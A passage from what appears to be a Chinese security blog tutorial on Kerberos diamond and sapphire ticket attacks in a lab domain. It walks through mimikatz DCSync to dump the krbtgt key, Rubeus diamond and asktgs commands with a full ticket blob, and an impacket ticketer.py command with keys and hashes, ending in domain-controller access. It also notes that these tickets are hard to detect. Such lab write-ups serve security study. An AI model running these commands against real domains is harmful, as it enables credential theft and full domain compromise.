+<h3 id="钻石票据攻击利用"><a href="#钻石票据攻击利用" class="headerlink" title="钻石票据攻击利用"></a>钻石票据攻击利用</h3><p>我们使用钻石票据的思路就是使用低权限的用户向域控请求一个普通的 <code>TGT</code>，随后进行解密修改签名和重新加密即可，当然这些事情<code>Rubeus</code>会自动帮我们完成，我们只需要提供信息即可。</p>
+<p>本地尝试<code>dir</code>拒绝访问</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922104-5c0d301a-4cda-4f2a-98df-9519564ba10d.png"></p>
+<p>使用 <code>mimikatz</code> 抓取 <code>krbtgt</code> 用户 <code>aes256</code>密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rootkit.org /user:krbtgt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922304-f15d4dc5-0f08-4339-926a-9224decc76d1.png"></p>
+<p>使用钻石票据需要提供以下信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">krbkey:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">低权限用户user:micle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">用户密码password:Admin12345</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">domain:rootkit.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dc:owa2013.rootkit.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ticketuser:administrator //伪造的票据用户名可以任意，不需要域中存在该用户</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe diamond /krbkey:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 /user:micle /password:Admin12345 /enctype:aes /domain:rootkit.org /dc:owa2013.rootkit.org /ticketuser:test123 /ptt /nowrap</span><br></pre></td></tr></table></figure>
+
+<p>以下为原<code>TGT</code></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922598-210360e7-d4a6-4ba0-97ee-e61172bd12e6.png"></p>
+<p>解密重新构造的<code>TGT</code></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922645-20d41036-0050-40c9-bc0e-8ec294ccb659.png"></p>
+<p>利用我们重新构造的<code>TGT</code>对域控的<code>cifs</code>服务进行票据注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgs /ticket:doIFMjCCBS6gAwIBBaEDAgEWooIEOzCCBDdhggQzMIIEL6ADAgEFoQ0bC1JPT1RLSVQuT1JHoiAwHqADAgECoRcwFRsGa3JidGd0GwtST09US0lULk9SR6OCA/UwggPxoAMCARKhAwIBA6KCA+MEggPfj2PsZr7SGEqJsPPl5wG8ljBVM4yBAtxGQNxTQQPo6WBMTxcXS+3f3vyYs6qab0uZ+X5UW45e4aW8T8VhsTOkSJ1jokudegt8ILFKbHNpuUTMywsfgjRb6o+CQkfyZMGep1bQ9FoKHw+qPyd6ql7bYK50u1zO+uhNQ61cQDymFiDaqu0UBLh9yI4qY81gpycKOZSWqy0T/cH52hn22IuuxfL9dKN9qdRF+YCnrqy9MBSPx5E3MGVroJZrLYqgDfPQ9g+u1pPabnci8ac3J2S8isxbTscP7hutRATWTQWeauRvG1DbNN6qANWagDNpPy9JEqQoLbqrr3GD/FEQhaANSZlX2IPzLj8EsUcKQExEVSaWC3OuUwqNGWBNhc1m+aJL9mt6D42SwWMyFvmREmlj/lDR9kv9IQmqupcFCloBkewpyFBlecHkkSFKwXGvde65Y7Z/5vP1Iq1el2VrZPPMhywUhk5JwnRNhInDokhYFOWMIdY3w/C2PreLdEiL5aFUc7e01y7uQV5Wbe/OJ6XZdNhbYKXZ9lzZdHAqSayQmo0TRpBCBwqAZUFZse3l5B7qwPP9WBJDLIZtNgV6GUt0CW9DVoIW0jdM1j2Hkl9B+CeM1xV7Vb2DMNh8gK6IfT7KWEHX8a+0GVwlQWkAW/O/IpjZc8+3rIkiIfCIqbGTwA/pnjfhsS2lOXetwW6S4jQ8C9SfKZbLWhPIxpRs9q9g3tWMUE22Pk06CD3T9GbdTEbVi0IvCQJSgNIGMu+sI9ISVZ78HNmYv2wAjjC0tcHusjG1DDj0obyfeg99icK1ZtZL0HmOcQCSwNZqqJDMOXix1uKXv8auJP0itVdUf/aYp8l0xDjVQRYzvefpuar1Ce2Dhguejc6nEfPKusFBPDNhYGw8WlSupnCjjwgNuuQT1WUXdNuTMpPAh3Grb0dj/2s3/WcqVI3P9eZMos6n+MnD8RJUjytPGAm+iKa30KmL3nJbxQEdBOCI9cY4SYmf09B9fQJhG7fEwyeUyjcRoCeOeLFlSM8MCs/qHUi+0MTkVyyiLYZWfcNY+20dCbwUtRz6zXUwQ4go8buZoZMKqnnio1rtzZxzqkqiYK+AbtRq7+9JPuX0chOr9GKqGQGEqaQZCqjOVCQKr1A+JK4mfhHxGwe0eDaDtGOTUnszGLhqQdmDVxNpKduOLjaQBN97ACnitC3Q1Ww6ZeCv51TVh2x787nNkYy5JWZrY0gd3FByb9UDkMmeODy/1oVireCYEfLAL8yUuu/REgZbkyIsxzSCeG/NUZN6ztjGn/IrJ06bEQS6OhuvPHKP51JIh/8HUaOB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoCswKaADAgESoSIEIFPwBQgPPeImtpqHK3V4zobqMKDh0uVBzmEB/v5GuE7noQ0bC1JPT1RLSVQuT1JHohQwEqADAgEBoQswCRsHdGVzdDEyM6MHAwUAQOEAAKURGA8yMDI0MDIwNTA0Mjk0OFqmERgPMjAyNDAyMDUxNDI5NDhapxEYDzIwMjQwMjEyMDQyOTQ4WqgNGwtST09US0lULk9SR6kgMB6gAwIBAqEXMBUbBmtyYnRndBsLUk9PVEtJVC5PUkc= /service:cifs/owa2013.rootkit.org /ptt /nowrap</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922814-b62d59c0-9e90-48e1-bdc2-e509edb3ae89.png"></p>
+<p>查看票据发现已经存在</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922692-99837381-7891-4bc1-b5ba-e63370da5a4a.png"></p>
+<p>尝试 <code>dir</code>域控和<code>psexec</code>均成功</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922835-ee4de11a-b136-4e08-aa64-f5e739743130.png"></p>
+<p>这种技术相比于金票更加隐蔽，因为过程中所申请的TGT是真实的，只是修改了PAC，相对你金票离线生成<code>TGT</code>更符合OPSEC</p>
+<h2 id="0x05-蓝宝石票据-Sapphire-Ticket"><a href="#0x05-蓝宝石票据-Sapphire-Ticket" class="headerlink" title="0x05 蓝宝石票据 Sapphire Ticket"></a>0x05 蓝宝石票据 Sapphire Ticket</h2><p>蓝宝石票据与钻石票据类似，票据不是伪造的，而是通过请求后获得的合法票据。他们的区别在于<code>PAC</code>的修改方式。钻石票据是修改了合法<code>PAC</code>以添加特权组。在蓝宝石票据中，高权限用户<code>PAC</code>是通过</p>
+<p><code>S4U2Self+U2U</code>获得的，然后该<code>PAC</code>会替换原来的<code>PAC</code>，由于该票据是完全合法元素组合起来的，所以是最难检测的票据。</p>
+<h3 id="S4U2self-U2U"><a href="#S4U2self-U2U" class="headerlink" title="S4U2self + U2U"></a>S4U2self + U2U</h3><p>为了在 Kerberos 协议层面对约束性委派进行支持，微软扩展了 <code>S4U2self</code> 协议，而使用 U2U 可以在没有 SPN 的情况下请求 <code>S4U2Self</code>。</p>
+<h3 id="尝试生成蓝宝石票据"><a href="#尝试生成蓝宝石票据" class="headerlink" title="尝试生成蓝宝石票据"></a>尝试生成蓝宝石票据</h3><p>在这里使用魔改过的 <code>ticketer.py</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ShutdownRepo/impacket/tree/6c9a1aadbfc11e321858a640b596530535b11fd1</span><br></pre></td></tr></table></figure>
+
+<p>将域控的ip地址加入hosts，使用如下命令生成票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ticketer.py -request -impersonate &#x27;administrator&#x27; -domain &#x27;rootkit.org&#x27; -user &#x27;micle&#x27; -password &#x27;Admin12345&#x27; -aesKey &#x27;3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745&#x27; -domain-sid &#x27;S-1-5-21-3759881954-2993291187-3577547808&#x27; -nthash &#x27;c3d5042c67ef5f461d0ba6ecdd9ea449&#x27; &#x27;Sapphire&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536923342-f15f079d-489d-405b-abfb-1a649ec8033c.png"></p>
+<p>通过抓包可以看到我们指定了要获取服务票证的用户名<code>administrator</code> ，此外我们还为用户请求了服务票证，执行 <code>U2U</code></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536923186-65feb858-d341-4059-9350-ca76d1325c73.png"></p>
+<p>使用<code>mimikatz</code>导入该票据，成功<code>dir</code>域控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc ignored.ccache</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536923259-0b1f25be-be36-40ec-9055-b7f64dfcafdf.png"></p>
+<p>由于该票据很难被检测到，只能通过人工排查<code>krbrgt</code>账户被盗等情况入手</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13032?time__1311=eqUxuDcDBD0Dg7CeDsjOxiqiKmx7Tw+YRpD&u_atoken=f52bd5554f81e725f08eebdd4ea25593&u_asig=0a472f9017425368091076282e0119">https://xz.aliyun.com/news/13032?time__1311=eqUxuDcDBD0Dg7CeDsjOxiqiKmx7Tw%2BYRpD&amp;u_atoken=f52bd5554f81e725f08eebdd4ea25593&amp;u_asig=0a472f9017425368091076282e0119</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Kerberos-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">0x01 Kerberos 身份认证流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-Ticket"><span class="toc-number">2.</span> <span class="toc-text">0x02 黄金票据 Golden Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Mimikatz%E6%B3%A8%E5%85%A5%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.3.</span> <span class="toc-text">使用Mimikatz注入票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AC%BA%E9%AA%97%E6%80%A7%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">2.4.</span> <span class="toc-text">欺骗性用户名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E6%88%90%E5%91%98%E8%B5%84%E6%A0%BC"><span class="toc-number">2.5.</span> <span class="toc-text">组成员资格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#impacket-%E4%B8%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.6.</span> <span class="toc-text">impacket 下黄金票据的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Rubeus-exe-%E4%BC%A0%E9%80%92%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.7.</span> <span class="toc-text">使用 Rubeus.exe 传递票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-%E4%B8%8B%E7%9A%84-mimikatz"><span class="toc-number">2.8.</span> <span class="toc-text">msf 下的 mimikatz</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Ticket"><span class="toc-number">3.</span> <span class="toc-text">0x03 白银票据 Silver Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-1"><span class="toc-number">3.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">3.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95-mimikatz-%E6%B3%A8%E5%85%A5%E7%A5%A8%E6%8D%AE"><span class="toc-number">3.3.</span> <span class="toc-text">尝试 mimikatz 注入票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-rubeus-%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.</span> <span class="toc-text">使用 rubeus 进行注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E4%B8%8E%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">3.5.</span> <span class="toc-text">黄金票据与白银票据的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E9%92%BB%E7%9F%B3%E7%A5%A8%E6%8D%AE-Diamond-Ticket"><span class="toc-number">4.</span> <span class="toc-text">0x04 钻石票据 Diamond Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%BB%E7%9F%B3PAC"><span class="toc-number">4.1.</span> <span class="toc-text">钻石PAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%BB%E7%9F%B3%E7%A5%A8%E6%8D%AE%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">钻石票据攻击利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E8%93%9D%E5%AE%9D%E7%9F%B3%E7%A5%A8%E6%8D%AE-Sapphire-Ticket"><span class="toc-number">5.</span> <span class="toc-text">0x05 蓝宝石票据 Sapphire Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#S4U2self-U2U"><span class="toc-number">5.1.</span> <span class="toc-text">S4U2self + U2U</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%94%9F%E6%88%90%E8%93%9D%E5%AE%9D%E7%9F%B3%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.2.</span> <span class="toc-text">尝试生成蓝宝石票据</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&text=四种票据利用方式"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=四种票据利用方式"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&is_video=false&description=四种票据利用方式"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=四种票据利用方式&body=Check out this article: https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=四种票据利用方式"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=四种票据利用方式"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=四种票据利用方式"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=四种票据利用方式"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&name=四种票据利用方式&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&t=四种票据利用方式"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Ca1m
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
